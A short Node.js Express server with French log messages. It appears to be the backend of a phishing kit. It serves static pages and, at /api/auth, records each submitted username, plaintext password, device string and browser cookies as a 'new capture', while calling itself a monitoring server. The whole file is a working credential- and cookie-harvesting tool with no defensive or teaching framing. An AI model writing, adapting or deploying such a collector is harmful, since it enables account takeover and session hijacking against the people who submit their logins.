const express = require('express');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname)));

app.post('/api/auth', (req, res) => {
    const data = req.body;
    
    console.log("\n--- NOUVELLE CAPTURE (" + data.date + ") ---");
    console.log("USER     : " + data.identifiant);
    console.log("PASS     : " + data.password);
    console.log("DEVICE   : " + data.userAgent);
    console.log("COOKIES  : " + (data.cookies_locaux || "Aucun"));
    console.log("-------------------------------------------\n");

    res.status(200).json({ status: "ok" });
});

app.listen(PORT, () => {
    console.log("Serveur de monitoring actif sur le port " + PORT);
});
